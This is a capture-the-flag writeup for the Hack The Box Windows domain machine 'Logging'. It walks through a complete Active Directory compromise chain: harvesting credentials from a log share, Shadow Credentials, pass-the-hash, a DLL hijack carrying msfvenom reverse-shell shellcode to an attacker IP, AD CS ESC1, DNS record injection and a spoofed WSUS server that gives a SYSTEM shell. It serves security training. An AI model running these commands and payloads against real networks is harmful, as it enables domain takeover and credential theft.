# HTB — Logging Machine Writeup

**Difficulty:** Meduim | **OS:** Windows Server 2019 | Written_by :Atrox
 | **Domain:** logging.htb | **DC:** DC01.logging.htb  
**Given Credentials:** `wallace.everette / Welcome2026@`

---

## 1. Reconnaissance

### Environment Setup

```bash
# Add target to /etc/hosts
echo "10.129.33.35 logging.htb DC01.logging.htb" >> /etc/hosts

# Configure Kerberos
cat > /etc/krb5.conf << EOF
[libdefaults]
    default_realm = LOGGING.HTB
    dns_lookup_realm = false
    dns_lookup_kdc = false
    ticket_lifetime = 24h
    forwardable = true

[realms]
    LOGGING.HTB = {
        kdc = DC01.logging.htb
        admin_server = DC01.logging.htb
    }

[domain_realm]
    .logging.htb = LOGGING.HTB
    logging.htb = LOGGING.HTB
EOF
```

### Port Scan

```bash
nmap -sV -sC -p- --min-rate 5000 -T4 10.129.33.35
```

**Open Ports:**

|Port|Service|Notes|
|---|---|---|
|53|DNS|Active Directory DNS|
|80|IIS 10.0|Default page only|
|88|Kerberos|AD authentication|
|135/139/445|RPC/SMB|Windows file sharing|
|389/636/3268/3269|LDAP/LDAPS|Active Directory|
|464|kpasswd|Kerberos password change|
|593|RPC over HTTP||
|5985|WinRM|Remote management|
|8530/8531|WSUS HTTP/HTTPS|Windows Update Services|

### Web Enumeration

```bash
gobuster dir -u http://10.129.33.35:8530/ \
  -w /usr/share/wordlists/dirb/common.txt \
  -x aspx,asp -t 50
```

**Found:**

- `/inventory` (HTTP 301) — empty ASP.NET endpoint
- `/content` (HTTP 403)

**WSUS SOAP endpoints discovered:**

- `GET /ClientWebService/client.asmx` → 200 (unauthenticated)
- `GET /SimpleAuthWebService/SimpleAuth.asmx` → 200 (unauthenticated)
- `GET /ApiRemoting30/WebService.asmx` → 401 (requires auth)

---

## 2. SMB Enumeration & Credential Discovery

### Share Listing

```bash
smbclient -L //10.129.33.35/ -U 'logging.htb\wallace.everette%Welcome2026@'
```

|Share|Type|Notes|
|---|---|---|
|ADMIN$|Disk|Remote Admin|
|C$|Disk|Default share|
|IPC$|IPC|Remote IPC|
|**Logs**|Disk|**Non-standard — target**|
|NETLOGON|Disk|Logon server share|
|SYSVOL|Disk|Logon server share|
|WSUSTemp|Disk|WSUS temporary files|

### Download Logs Share

```bash
mkdir -p ~/htb/logging/Logs
cd ~/htb/logging/Logs
smbclient //10.129.33.35/Logs \
  -U 'logging.htb\wallace.everette%Welcome2026@' \
  -c 'recurse ON; prompt OFF; mget *'
```

**Files found:**

- `Audit_Heartbeat.log` (1294 bytes)
- `IdentitySync_Trace_20260219.log` (8488 bytes) ← **Critical**
- `Service_State.log` (468 bytes)
- `TaskMonitor.log` (1170 bytes)

### Credential Leak in Trace Log

```bash
grep -iE 'password|bindpass|credential' ~/htb/logging/Logs/*.log
```

**Found in `IdentitySync_Trace_20260219.log`:**

```
[VERBOSE] ConnectionContext Dump: {
  Domain: "logging.htb",
  Server: "DC01",
  BindUser: "LOGGING\svc_recovery",
  BindPass: "Em3rg3ncyPa$$2026",   ← Cleartext password!
  Timeout: 30
}
```

> **Note:** The log initially showed `Em3rg3ncyPa$$2025` but the password was rotated on **April 16, 2026** (decoded from `pwdLastSet` Windows FILETIME). The correct password is **`Em3rg3ncyPa$$2026`**.

---

## 3. LDAP Enumeration

```bash
ldapsearch -x -H ldap://10.129.33.35 \
  -D 'wallace.everette@logging.htb' \
  -w 'Welcome2026@' \
  -b 'DC=logging,DC=htb' \
  '(objectClass=user)' sAMAccountName userAccountControl memberOf
```

### Key Users

|Account|Groups|UAC|Notes|
|---|---|---|---|
|`Administrator`|Domain Admins, Enterprise Admins|66048|Target|
|`svc_recovery`|**Emergency Recovery**, Protected Users|66048|Credential found|
|`jaylee.clifton`|**IT**, Performance Log Users|66048|IT group = cert enroll rights|
|`msa_health$`|(MSA)|4096|Managed Service Account|
|`toby.brynleigh`|Domain Admins|66048|DA account|
|`wallace.everette`|Domain Admins (nominal)|66048|Given account — constrained|

> **Key insight:** `wallace.everette` is listed as DA but cannot DCSync, reset passwords, or write to C$. The DA membership is cosmetic.

> **Key insight:** `svc_recovery` is in **Protected Users** — no NTLM auth, Kerberos only. WinRM via password fails.

---

## 4. BloodHound Analysis

```bash
# Sync clock first
sudo ntpdate 10.129.33.35

# Collect BloodHound data
bloodhound-python -u wallace.everette -p 'Welcome2026@' \
  -d logging.htb -dc DC01.logging.htb \
  -ns 10.129.33.35 -c All --zip \
  --auth-method kerberos
```

### Attack Path Identified

```
SVC_RECOVERY ──[GenericWrite]──► MSA_HEALTH$ ──[CanPSRemote]──► DC01
                                      │
                                 [DCSync] ──► LOGGING.HTB (Domain)
```

- `svc_recovery` → **GenericWrite** on `msa_health$` → Shadow Credentials attack
- `msa_health$` → **CanPSRemote** on DC01 → WinRM access
- `msa_health$` → **DCSync** rights → dump all hashes

---

## 5. Initial Access — svc_recovery

### Clock Synchronization (Required for Kerberos)

```bash
sudo ntpdate 10.129.33.35
```

> **Important:** Always sync clock before Kerberos operations. If system clock drifts, use `faketime -f "+7 hours"` prefix for all commands.

### Get TGT for svc_recovery

```bash
impacket-getTGT logging.htb/svc_recovery:'Em3rg3ncyPa$$2026' \
  -dc-ip 10.129.33.35
export KRB5CCNAME=svc_recovery.ccache
klist
```

> **Note:** `svc_recovery` is in **Protected Users** group:
> 
> - ❌ No NTLM authentication
> - ❌ No CredSSP/Digest/Basic
> - ✅ Kerberos only
> - WinRM requires `Remote Management Users` group membership — svc_recovery is NOT in this group

---

## 6. Shadow Credentials — msa_health$

Since `svc_recovery` has **GenericWrite** on `msa_health$`, we can perform a Shadow Credentials attack to obtain `msa_health$`'s NT hash.

```bash
export KRB5CCNAME=svc_recovery.ccache

faketime -f "+7 hours" certipy-ad shadow auto \
  -k -no-pass \
  -username svc_recovery@logging.htb \
  -account 'msa_health$' \
  -target DC01.logging.htb \
  -dc-ip 10.129.33.35
```

**Output:**

```
[*] Successfully added Key Credential with device ID '...' to msa_health$
[*] Got TGT
[*] Saved credential cache to 'msa_health.ccache'
[*] NT hash for 'msa_health$': 603fc24ee01a9409f83c9d1d701485c5
```

### WinRM as msa_health$ (Pass-the-Hash)

`msa_health$` is in **Remote Management Users** — WinRM works with NTLM PTH:

```bash
evil-winrm -i 10.129.33.35 \
  -u 'msa_health$' \
  -H 603fc24ee01a9409f83c9d1d701485c5
```

---

## 7. DLL Hijacking — jaylee.clifton

### Discovery

From the msa_health$ WinRM shell:

```powershell
# Find UpdateMonitor scheduled task
dir "C:\Program Files\UpdateMonitor\"
type "C:\ProgramData\UpdateMonitor\Logs\monitor.log"
```

**UpdateMonitor behavior (from logs):**

1. Runs as `jaylee.clifton` every **3 minutes**
2. Checks for `C:\ProgramData\UpdateMonitor\Settings_Update.zip`
3. If found, extracts and loads `settings_update.dll` from `C:\Program Files\UpdateMonitor\bin\`
4. Calls exported function `PreUpdateCheck` from the DLL

### Craft Malicious DLL

```bash
LHOST="10.10.15.147"
LPORT="4444"

# Generate 32-bit reverse shell shellcode
msfvenom -p windows/shell_reverse_tcp \
  LHOST=$LHOST LPORT=$LPORT \
  -f c -v shellcode > /tmp/shellcode.h

# Write DLL source with PreUpdateCheck export
cat > ~/htb/logging/settings_update.c << 'EOF'
#include <windows.h>
#include <stdlib.h>

// SHELLCODE_HERE (paste msfvenom output)

__declspec(dllexport) void PreUpdateCheck(void) {
    void *exec = VirtualAlloc(NULL, sizeof(shellcode),
                              MEM_COMMIT | MEM_RESERVE,
                              PAGE_EXECUTE_READWRITE);
    if (exec) {
        memcpy(exec, shellcode, sizeof(shellcode));
        HANDLE hThread = CreateThread(NULL, 0,
                         (LPTHREAD_START_ROUTINE)exec,
                         NULL, 0, NULL);
        if (hThread) WaitForSingleObject(hThread, 30000);
    }
}

BOOL APIENTRY DllMain(HMODULE hModule,
                      DWORD ul_reason_for_call,
                      LPVOID lpReserved) {
    return TRUE;
}
EOF

# Compile as 32-bit (UpdateMonitor.exe is 32-bit)
i686-w64-mingw32-gcc -shared -o settings_update.dll settings_update.c

# Verify architecture and export
file settings_update.dll
# Expected: PE32 executable (DLL) Intel 80386

i686-w64-mingw32-objdump -p settings_update.dll | grep PreUpdateCheck
# Expected: [0] +base[1] 0000 PreUpdateCheck

# Create zip
zip Settings_Update.zip settings_update.dll
```

### Upload and Execute

```bash
# Start listener
nc -lvnp 4444
```

```powershell
# In msa_health$ evil-winrm shell
cd C:\ProgramData\UpdateMonitor
upload Settings_Update.zip

# Watch log for execution
while($true) {
    Get-Date
    type C:\ProgramData\UpdateMonitor\Logs\monitor.log | Select-Object -Last 5
    Start-Sleep 15
}
```

**Expected log output:**

```
[*] Successfully unzipped update to C:\Program Files\UpdateMonitor\bin\
[*] Loading update applier: ...settings_update.dll
[*] Calling 'PreUpdateCheck' in settings_update.dll
```

**Result:** Reverse shell as `jaylee.clifton` on port 4444.

### User Flag

```cmd
type C:\Users\jaylee.clifton\Desktop\user.txt
```

---

## 8. AD CS ESC1 — UpdateSrv Template

### Certificate Template Enumeration

```bash
# Get jaylee's TGT via Rubeus tgtdeleg (from her shell)
# In jaylee's shell:
.\Rubeus.exe tgtdeleg /nowrap
# Copy base64 ticket

# On Kali - convert kirbi to ccache
echo "<BASE64_TICKET>" | base64 -d > jaylee.clifton.kirbi
impacket-ticketConverter jaylee.clifton.kirbi jaylee.clifton.ccache
export KRB5CCNAME=jaylee.clifton.ccache
```

### Vulnerable Template: UpdateSrv

|Property|Value|
|---|---|
|Template Name|`UpdateSrv`|
|Enrollment Rights|`LOGGING.HTB\IT` ← jaylee is in IT|
|Enrollee Supplies Subject|**True (ESC1)**|
|Extended Key Usage|Server Authentication|
|Manager Approval|Not required|

### Request WSUS Certificate

```bash
faketime -f "+7 hours" certipy-ad req \
  -k -no-pass \
  -ca logging-DC01-CA \
  -template UpdateSrv \
  -upn wsus.logging.htb \
  -dns wsus.logging.htb \
  -target DC01.logging.htb \
  -dc-ip 10.129.33.209
```

**Output:**

```
[*] Successfully requested certificate
[*] Got certificate with multiple identifications
    UPN: 'wsus.logging.htb'
    DNS Host Name: 'wsus.logging.htb'
[*] Saved certificate and private key to 'wsus.logging.htb_wsus.pfx'
```

### Extract Cert and Key

```bash
certipy-ad cert -pfx wsus.logging.htb_wsus.pfx -nokey -out wsus.crt
certipy-ad cert -pfx wsus.logging.htb_wsus.pfx -nocert -out wsus.key
```

---

## 9. WSUS Spoofing — Domain Admin

### Context

From the incident ticket found at `C:\Users\jaylee.clifton\Documents\Tickets\Incident_4922_WSUS_Remediation_ViewExport.html`:

> DC01 is configured to check for updates at `https://wsus.logging.htb:8531/` with a **120-second ForceSync loop**

```powershell
# Verified via registry
reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate"
# WUServer = https://wsus.logging.htb:8531
# UseWUServer = 1
```

### Step 1 — Add DNS Record

```bash
# Add wsus.logging.htb → attacker IP in DC's DNS
cd /opt/krbrelayx   # git clone https://github.com/dirkjanm/krbrelayx.git

faketime -f "+7 hours" python3 dnstool.py \
  -u 'logging.htb\wallace.everette' \
  -p 'Welcome2026@' \
  --action add \
  --record wsus \
  --data 10.10.15.147 \
  --type A \
  10.129.33.35

# If record is tombstoned, fix it via ldap3
faketime -f "+7 hours" python3 << 'EOF'
import ldap3, struct, socket

server = ldap3.Server('10.129.33.35', get_info=ldap3.ALL)
conn = ldap3.Connection(server,
    user='logging.htb\\wallace.everette',
    password='Welcome2026@',
    authentication=ldap3.NTLM)
conn.bind()

ip = socket.inet_aton('10.10.15.147')
dns_record = struct.pack('<HHHIIHHI',
    4, 1, 0xF0, 0, 180, 900, 0, 0) + ip

dn = 'DC=wsus,DC=logging.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=logging,DC=htb'
conn.modify(dn, {
    'dnsRecord': [(ldap3.MODIFY_REPLACE, [dns_record])],
    'dNSTombstoned': [(ldap3.MODIFY_REPLACE, [False])]
})
print(f"[+] Result: {conn.result['description']}")
EOF

# Verify DNS resolution
nslookup wsus.logging.htb 10.129.33.35
# Expected: Address: 10.10.15.147
```

### Step 2 — Generate Reverse Shell Payload

```bash
msfvenom -p windows/x64/shell_reverse_tcp \
  LHOST=10.10.15.147 LPORT=5555 \
  -f exe -o ~/htb/logging/rev.exe
```

### Step 3 — Start Listener

```bash
nc -lvnp 5555
```

### Step 4 — Setup Fake WSUS Server

```bash
cd ~/htb/logging

# Enable nftables (required by wsuks)
sudo systemctl enable nftables
sudo systemctl start nftables

# Start wsuks fake WSUS server
sudo wsuks serve \
  --cert wsus.crt \
  --key wsus.key \
  --executable PsExec64.exe \
  --command "-accepteula -s -d C:\Windows\Temp\rev.exe"
```

> **How it works:** wsuks listens on port 8531 with our trusted certificate. When DC01 connects to `https://wsus.logging.htb:8531/` for its update check, it trusts our certificate (signed by `logging-DC01-CA`). wsuks serves a malicious update that executes `PsExec64.exe` as SYSTEM, which runs our `rev.exe` reverse shell.

### Step 5 — Upload Payload to DC (via msa_health$)

```powershell
# In msa_health$ evil-winrm
upload rev.exe C:\Windows\Temp\rev.exe

# Trigger update check
Start-Process "wuauclt.exe" -ArgumentList "/detectnow /updatenow" -NoNewWindow
Start-Process "usoclient.exe" -ArgumentList "StartScan" -NoNewWindow
```

### Step 6 — Receive SYSTEM Shell

The DC checks for updates every **120 seconds** automatically. When it connects to our fake WSUS server:

```
wsuks output:
[+] DC connected from 10.129.33.35
[+] Serving malicious update...
[+] Payload executed as SYSTEM
```

```
nc -lvnp 5555
connect from 10.129.33.35
C:\Windows\system32> whoami
nt authority\system
```

### Root Flag

```cmd
type C:\Users\Administrator\Desktop\root.txt
```

---

## Attack Chain Summary

```
wallace.everette (given creds)
    │
    ▼
SMB: Logs share → IdentitySync_Trace.log
    │
    └─► svc_recovery : Em3rg3ncyPa$$2026 (cleartext in log)
            │
            ▼
        Kerberos TGT (svc_recovery in Protected Users — no NTLM)
            │
            ▼
        GenericWrite on msa_health$ → Shadow Credentials Attack
            │
            ▼
        msa_health$ NT hash: 603fc24ee01a9409f83c9d1d701485c5
            │
            ▼
        evil-winrm PTH as msa_health$ (in Remote Management Users)
            │
            ▼
        Upload Settings_Update.zip → DLL Hijack via UpdateMonitor
            │
            ▼
        Reverse shell as jaylee.clifton ← USER FLAG
            │
            ▼
        Rubeus tgtdeleg → jaylee TGT → certipy ESC1
        UpdateSrv template (IT group enroll) → wsus.logging.htb cert
            │
            ▼
        DNS record: wsus.logging.htb → 10.10.15.147
        wsuks fake WSUS server with trusted cert
            │
            ▼
        DC connects → malicious update → SYSTEM shell ← ROOT FLAG
```

---

## Key Tools & Commands Reference

```bash
# Clock sync (always do this first)
sudo ntpdate 10.129.33.35

# Kerberos TGT
impacket-getTGT logging.htb/USER:'PASS' -dc-ip 10.129.33.35
export KRB5CCNAME=user.ccache

# Shadow Credentials
faketime -f "+7 hours" certipy-ad shadow auto \
  -k -no-pass -username USER@logging.htb \
  -account TARGET -target DC01.logging.htb -dc-ip 10.129.33.35

# BloodHound
bloodhound-python -u USER -p PASS -d logging.htb \
  -dc DC01.logging.htb -ns 10.129.33.35 -c All --zip

# AD CS cert request (ESC1)
faketime -f "+7 hours" certipy-ad req \
  -k -no-pass -ca logging-DC01-CA -template UpdateSrv \
  -dns wsus.logging.htb -target DC01.logging.htb

# DNS record via krbrelayx
python3 /opt/krbrelayx/dnstool.py \
  -u 'logging.htb\USER' -p 'PASS' \
  --action add --record wsus \
  --data 10.10.15.147 --type A 10.129.33.35

# DLL compile (32-bit with export)
i686-w64-mingw32-gcc -shared -o settings_update.dll settings_update.c

# Fake WSUS server
sudo wsuks serve --cert wsus.crt --key wsus.key \
  --executable PsExec64.exe \
  --command "-accepteula -s -d C:\Windows\Temp\rev.exe"
```

---

## Lessons Learned

|Finding|Technique|Impact|
|---|---|---|
|Cleartext creds in VERBOSE logs|SMB share enumeration|Initial foothold|
|Protected Users blocks NTLM|Kerberos-only auth with faketime|Auth bypass|
|Password rotation|Check pwdLastSet (year 2026 not 2025)|Correct creds|
|Shadow Credentials|GenericWrite → certipy shadow auto|Lateral movement|
|DLL Hijacking|Scheduled task loads user-supplied DLL|User pivot|
|AD CS ESC1|IT group enroll on UpdateSrv|WSUS cert|
|WSUS Spoofing|Trusted cert + fake server|DA/SYSTEM|
|DNS tombstoning|ldap3 modify to reactivate|DNS manipulation|